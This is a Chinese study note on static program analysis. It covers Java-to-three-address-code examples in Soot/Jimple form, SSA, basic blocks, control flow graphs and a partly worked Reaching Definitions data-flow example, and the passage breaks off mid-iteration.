      <p>从<code>JAVA</code>代码到<strong>三地址码</strong></p>

        <h3 id="For循环例子"   >
          <a href="#For循环例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#For循环例子" class="headerlink" title="For循环例子"></a><code>For</code>循环例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForLoop3AC</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)&#123;</span><br><span class="line">            x = x + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">	java.lang.String[] r0;</span><br><span class="line">    <span class="keyword">int</span> i1;</span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[]; <span class="comment">//参数类型的定义</span></span><br><span class="line">    </span><br><span class="line">    i1 = <span class="number">0</span>;		<span class="comment">//变量x</span></span><br><span class="line">    </span><br><span class="line">label1:			<span class="comment">//这里变量x和变量i被soot优化成一个变量i1了</span></span><br><span class="line">    <span class="keyword">if</span> i1 &gt;= <span class="number">10</span> goto label2;</span><br><span class="line">    </span><br><span class="line">    i1 = i1 + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    goto label1;</span><br><span class="line">   </span><br><span class="line">label2:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="do-while以及数组例子"   >
          <a href="#do-while以及数组例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#do-while以及数组例子" class="headerlink" title="do-while以及数组例子"></a><code>do-while</code>以及数组例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileLoop3AC</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">while</span>(arr[i] &lt; <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">	java.lang.String[] r0;</span><br><span class="line">    <span class="keyword">int</span>[] r1;</span><br><span class="line">    <span class="keyword">int</span> $i0,i1;</span><br><span class="line">    </span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[];<span class="comment">//参数类型定义</span></span><br><span class="line">    </span><br><span class="line">    r1 = newarray(<span class="keyword">int</span>)[<span class="number">10</span>]; <span class="comment">//array形式的赋值</span></span><br><span class="line">    </span><br><span class="line">    i1 = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">label1:</span><br><span class="line">    i1 = i1 + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    $i0 = r1[i1]; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> $i0 &lt; <span class="number">10</span> goto label1;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="函数调用例子"   >
          <a href="#函数调用例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数调用例子" class="headerlink" title="函数调用例子"></a>函数调用例子</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCall3AC</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">foo</span><span class="params">(String para1, String para2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> para1 + <span class="string">&quot; &quot;</span> + para2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MethodCall3AC mc = <span class="keyword">new</span> MethodCall3AC();</span><br><span class="line">        String result = mc.foo(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">java.lang.<span class="function">String <span class="title">foo</span><span class="params">(java.lang.String, java.lang.String)</span></span>&#123;</span><br><span class="line">    nju.sa.example.MethodCall3AC r0;</span><br><span class="line">    java.lang.String r1,r2,$r7;</span><br><span class="line">    java.lang.StringBuilder $r3,$r4,$r5,$r6;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//参数类型和函数名</span></span><br><span class="line">    r0 := <span class="meta">@this</span>: nju.sa.examples.MethodCall3AC;</span><br><span class="line">    r1 := <span class="meta">@parameter0</span>: java.lang.String;</span><br><span class="line">    r2 := <span class="meta">@parameter1</span>: java.lang.String;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个String</span></span><br><span class="line">    $r3 = <span class="keyword">new</span> java.lang.StringBuilder;</span><br><span class="line">    specialinvoke $r3.&lt;java.lang.StringBuilder: <span class="keyword">void</span>&lt;init&gt;()&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用StringBuilder下的append,对应para1 + &quot; &quot; + para2</span></span><br><span class="line">    $r4 = virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(r1)</span></span>;</span><br><span class="line">    $r5 = virtualinvoke $r4.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(<span class="string">&quot; &quot;</span>)</span></span>;</span><br><span class="line">    $r6 = virtualinvoke $r5.&lt;java.lang.StringBuilder: java.lang.<span class="function">StringBuilder <span class="title">append</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(r2)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//完成之后需要toString来获取最终的变量</span></span><br><span class="line">    $r7 = virtualinvoke $r6.&lt;java.lang.StringBuilder: java.lang.<span class="function">String <span class="title">toString</span><span class="params">()</span>&gt;<span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $r7;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">    java.lang.String[] r0;</span><br><span class="line">    nju.sa.examples.MethodCall3AC $r3;</span><br><span class="line">    </span><br><span class="line">    r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个MethodCall3Ac</span></span><br><span class="line">    $r3 = <span class="keyword">new</span> nju.sa.examples.MethodCall3Ac;</span><br><span class="line">    specialinvoke $r3.&lt;nju.sa.examples.MethodCall3Ac: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    virtualinvoke $r3.&lt;nju.sa.examples.MethodCall3AC: java.lang.<span class="function">String <span class="title">foo</span><span class="params">(java.lang.String,java.lang.String)</span>&gt;<span class="params">(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里有个关于函数调用的知识点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221228180921880.png" alt="image-20221228180921880"></p>
<p>不同<code>invoke</code>在三地址码中代表调用不同的函数，是在<code>JVM</code>虚拟机中的一种表示。</p>
<ul>
<li>在<code>&lt;method signature&gt;</code>中的<code>method signture</code>通常结构为<code>class name: return type method name(parameter1 type)</code></li>
</ul>

        <h3 id="静态变量和类"   >
          <a href="#静态变量和类" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态变量和类" class="headerlink" title="静态变量和类"></a>静态变量和类</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Class3AC</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>转换为</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">nju</span>.<span class="title">sa</span>.<span class="title">examples</span>.<span class="title">Class3AC</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()&#123;</span><br><span class="line">        nju.sa.examples.Class3AC r0;</span><br><span class="line">        </span><br><span class="line">        r0 := <span class="meta">@this</span>: nju.sa.examples.Class3AC;</span><br><span class="line">        </span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>&#123;</span><br><span class="line">        java.lang.String[] r0;</span><br><span class="line">        </span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//静态变量放在clinit函数中声明</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;clinit&gt;()&#123;</span><br><span class="line">        &lt;nju.sa.examples.Class3AC: <span class="keyword">double</span> pi&gt; = <span class="number">3.14</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-SSA-Static-Single-Assignment"   >
          <a href="#3-SSA-Static-Single-Assignment" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-SSA-Static-Single-Assignment" class="headerlink" title="3.SSA(Static Single Assignment)"></a>3.SSA(Static Single Assignment)</h2>
      <p>和三地址码<code>3AC</code>类似的一种表达方式，有优点也有缺点，但是大多用的是<code>3AC</code>，对于<code>SSA</code>区别如下</p>
<ul>
<li>每个定义的变量都有自己的不同名字</li>
<li>每个变量都有自己的定义</li>
</ul>
<p>比如</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229182529367.png" alt="image-20221229182529367"></p>
<p>如果有多的相同变量，则会有一个函数来判断，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229182112639.png" alt="image-20221229182112639"></p>
<p>即<code>X2 = ∅(X0,X1) </code>会用来判断值到底是哪个</p>

        <h2 id="4-基础块-Basic-Block"   >
          <a href="#4-基础块-Basic-Block" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-基础块-Basic-Block" class="headerlink" title="4.基础块(Basic Block)"></a>4.基础块(Basic Block)</h2>
      
        <h3 id="定义："   >
          <a href="#定义：" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3>
      <ul>
<li>只有一个入口指令，入口指令为第一个指令</li>
<li>只有一个出口指令，出口指令为最后一个指令</li>
<li>一个跳转目的点应该是一个<code>BB</code>的入口指令</li>
</ul>

        <h3 id="方法："   >
          <a href="#方法：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3>
      <p>如下为例子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229195930007.png" alt="image-20221229195930007"></p>
<ul>
<li><p>首先确定程序中入口</p>
<p>即**(1)**为入口</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200108674.png" alt="image-20221229200108674"></p>
</li>
<li><p>然后确定跳转指令的目的地址，标记为<code>leader</code>，依据指令**(4)<strong>、</strong>(10)<strong>和</strong>(11)<strong>即可确定这里即为</strong>(3)<strong>、</strong>(7)<strong>和</strong>(12)**</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200132805.png" alt="image-20221229200132805"></p>
</li>
<li><p>跳转指令后面的指令为一个<code>leader</code>，依据指令**(4)<strong>、</strong>(10)<strong>和</strong>(11)<strong>即可确定这里即为</strong>(5)、(11)、(12)**</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229200508572.png" alt="image-20221229200508572"></p>
</li>
<li><p>依据<code>leader</code>来划分<code>BB</code>，即一个<code>BB</code>应该是由一个<code>leader</code>到下一个<code>leader</code>之间的所有指令构成，不包括下一个<code>leader</code></p>
<ul>
<li><p><code>leaders</code>： <strong>(1), (3), (5), (7), (11), (12)</strong></p>
</li>
<li><p>划分<code>BB</code>：</p>
<ul>
<li><code>BB1</code>：**(1)~(2)**</li>
<li><code>BB2</code>：**(3)~(5)**</li>
<li><code>BB3</code>：**(5)~(6)**</li>
<li><code>BB4</code>：**(7)~(10)**</li>
<li><code>BB5</code>：**(11)**</li>
<li><code>BB6</code>：**(12)**</li>
</ul>
</li>
<li><p>得到最终<code>BB</code>结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201021799.png" alt="image-20221229201021799"></p>
</li>
</ul>
</li>
</ul>

        <h2 id="5-CFG-Control-Flow-Graph"   >
          <a href="#5-CFG-Control-Flow-Graph" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-CFG-Control-Flow-Graph" class="headerlink" title="5.CFG(Control Flow Graph)"></a>5.CFG(Control Flow Graph)</h2>
      
        <h3 id="定义：-1"   >
          <a href="#定义：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h3>
      <ul>
<li>每个节点<code>node</code>为一个<code>BB</code></li>
<li>两个节点<code>node</code>之间只能有一条边</li>
</ul>

        <h3 id="方法：-1"   >
          <a href="#方法：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3>
      <ul>
<li><p>首先跳转指令的跳转目的地址都修改为对应的<code>BB</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201645109.png" alt="image-20221229201645109"></p>
</li>
<li><p>然后依据跳转指令，将对应跳转进行连边，即得到</p>
<p><code>B2-&gt;B4</code>、<code>B4-&gt;B6</code>、<code>B5-&gt;B2</code>三条边</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229201736630.png" alt="image-20221229201736630"></p>
</li>
<li><p>从程序入口到程序出口间所有的<code>BB</code>，由上至下两两添加一条边，除了包含无条件跳转的<code>BB</code>，那么得到</p>
<p><code>B1-&gt;B2</code>、<code>B2-&gt;B3</code>、<code>B3-&gt;B4</code>、<code>B4-&gt;B5</code>四条边，由于<code>B5</code>出口指令为无条件跳转，所以<code>B5-&gt;B6</code>没有边，得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229202220689.png" alt="image-20221229202220689"></p>
</li>
<li><p>依据边的方向，得到各个<code>BB</code>之间的前驱后继的关系</p>
</li>
<li><p>加入<code>Entry</code>和<code>Exit</code>，得到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221229202406452.png" alt="image-20221229202406452"></p>
</li>
</ul>

        <h1 id="二、Data-Flow-Analysis-I"   >
          <a href="#二、Data-Flow-Analysis-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、Data-Flow-Analysis-I" class="headerlink" title="二、Data Flow Analysis I"></a>二、Data Flow Analysis I</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104952338.png" alt="image-20230114104952338"></p>
<p>即数据(DATA)在CFG(Control Flow Graph)中<code>Flow</code>的过程分析</p>

        <h2 id="1-基本概念"   >
          <a href="#1-基本概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2>
      
        <h3 id="常见符号"   >
          <a href="#常见符号" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3>
      <ul>
<li><p>抽象符号</p>
<ul>
<li><p><code>⊥</code>：未定义</p>
</li>
<li><p><code>+、-</code>：常见正负表示</p>
</li>
<li><p><code>0</code>：即零</p>
</li>
</ul>
</li>
</ul>

        <h3 id="IN-S-和OUT-S"   >
          <a href="#IN-S-和OUT-S" class="heading-link"><i class="fas fa-link"></i></a><a href="#IN-S-和OUT-S" class="headerlink" title="IN[S]和OUT[S]"></a>IN[S]和OUT[S]</h3>
      <p>一个<code>IR</code>语句的输入数据集合以及输出数据集合，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230101356151.png" alt="image-20221230101356151"></p>
<p>然后也区分几种状况，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230101529915.png" alt="image-20221230101529915"></p>
<ul>
<li><p>状况1：<code>IN[S2] = OUT[S1]</code>，常见流程</p>
</li>
<li><p>状况2：<code>IN[S2]、IN[S3] = OUT[S1]</code>，分支流程</p>
</li>
<li><p>状况3：<code>IN[S2] = OUT[S1] ^ OUT[S3]</code>，交汇流程</p>
<p>其中的合并操作称为<code>meet</code>操作，常见有取交集、并集之类的，需要定义</p>
</li>
</ul>

        <h3 id="分析方向"   >
          <a href="#分析方向" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析方向" class="headerlink" title="分析方向"></a>分析方向</h3>
      <ul>
<li><p><code>Forward Analysis</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230102820182.png" alt="image-20221230102820182"></p>
<p>相关公式<br>$$<br>OUT[s] = f_s(IN[s])<br>$$</p>
</li>
<li><p><code>Backward Analysis</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230102900026.png" alt="image-20221230102900026"></p>
<p>相关公式<br>$$<br>IN[s] = f_s(OUT[s])<br>$$</p>
</li>
</ul>

        <h2 id="2-BB之间的分析"   >
          <a href="#2-BB之间的分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BB之间的分析" class="headerlink" title="2.BB之间的分析"></a>2.<code>BB</code>之间的分析</h2>
      <ul>
<li><p>在一个基本块<code>BB</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230103138670.png" alt="image-20221230103138670"></p>
<p><code>IN[s]</code>以及<code>OUT[s]</code>可以用一个循环表示<br>$$<br>IN[s_{i+1}] = OUT[s_i], for\ all\ i = 1,2, …, n-1\<br>OUT[s_i] = f_s(IN[s_{i-1}])<br>$$</p>
</li>
<li><p>同样的多个基本块<code>BB</code>中</p>
<ul>
<li>即<code>B1 -&gt; B2 -&gt; B3</code>这样的</li>
</ul>
<p>$$<br>IN[B] = IN[s_1],  OUT[B] = OUT[s_n]\<br>OUT[B] = f_B(IN[B]), f_B = f_{sn} \ ⚬ \ …\  ⚬\  f_{s2}\ ⚬\ f_{s1}<br>$$</p>
<ul>
<li><p>当然还有其它的，交汇</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230105038522.png" alt="image-20221230105038522"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ^p OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>^p</code>代表取所有的<code>p</code>做<code>meet</code>操作</p>
</li>
<li><p>还有分支，分支的<code>OUT[B]</code>都等于下一个的<code>IN[B.]</code></p>
</li>
</ul>
</li>
</ul>

        <h2 id="3-Reaching-Definition"   >
          <a href="#3-Reaching-Definition" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Reaching-Definition" class="headerlink" title="3.Reaching Definition"></a>3.Reaching Definition</h2>
      <p>即一个变量<code>v</code>从定义点<code>p</code>，到某一点<code>q</code>这条路径中，<code>v</code>没有再被重新定义，那么这条路径可以被当作<code>Reaching Definition</code>，如果再被重新定义了，则不能，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230111227435.png" alt="image-20221230111227435"></p>

        <h3 id="Data-Flow-Facts"   >
          <a href="#Data-Flow-Facts" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有定义变量的语句标记为一个<code>bit</code>向量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230111953040.png" alt="image-20221230111953040"></p>

        <h3 id="Control-Flow"   >
          <a href="#Control-Flow" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>用来求<code>IN[B]</code>，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112722811.png" alt="image-20221230112722811"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = Up  predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Up</code>代表取<code>B</code>的前驱，即所有的<code>p</code>做<code>union</code>操作，即并集</p>

        <h3 id="Transfer-Function"   >
          <a href="#Transfer-Function" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>即数据流分析中的转换函数的相关定义，<code>forward</code>下知道<code>IN[B]</code>用来求<code>OUT[B]</code><br>$$<br>OUT[B] = gen_B\ U\ (IN[B] - kill_B)<br>$$</p>
<ul>
<li><code>genB</code>：表示当前基本块中定义的所有变量的合集</li>
<li><code>killB</code>：表示当前基本块中定义的所有变量，并且这些变量在其他基本块中也被定义了的合集</li>
</ul>
<p>例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112140537.png" alt="image-20221230112140537"></p>

        <h3 id="Algorithm"   >
          <a href="#Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230113741886.png" alt="image-20221230113741886"></p>
<p>其中对于每个<code>BB</code>的赋值，在<code>may analysis</code>中大多为空，而在<code>must analysis</code>中大多不为空，所以并没有把<code>OUT[entry] = ∅; </code>加进来</p>

        <h4 id="例子"   >
          <a href="#例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可迭代</p>

        <h5 id="第一次迭代"   >
          <a href="#第一次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230115302112.png" alt="image-20221230115302112"></p>
<ul>
<li><p><code>Entry-&gt;B1</code>：</p>
<ul>
<li><p><code>OUT[Entry] = 0000 0000</code></p>
</li>
<li><p><code>IN[B1] = Up OUT[p] = OUT[Entry] = 0000 0000</code></p>
</li>
<li><p><code>genB1 = D1 + D2 = 1100 0000 </code></p>
</li>
<li><p><code>killB1 = D5 + D7 + D4 = 0001 1010  </code></p>
</li>
<li><p><code>IN[B1] - killB1 = 0000 0000 - 0001 1010 = 0000 0000</code></p>
<p>都是0，减去之后还是0</p>
</li>
<li><p><code>OUT[B1] = genB1 U (IN[B1] - killB1) = 1100 0000 + 0000 0000 = 1100 0000</code>   </p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230121324875.png" alt="image-20221230121324875"></p>
</li>
<li><p><code>B1-&gt;B2</code>：</p>
<ul>
<li><code>OUT[B1] = genB1 U (IN[B1] - killB1) = 1100 0000 + 0000 0000 = 1100 0000</code>   </li>
<li><code>IN[B2]  = Up OUT[p] = OUT[B1] + OUT[B4] = 1100 0000</code></li>
<li><code>genB2 = D3 + D4 = 0011 0000 </code></li>
<li><code>killB2 = D2 = 0100 0000  </code></li>
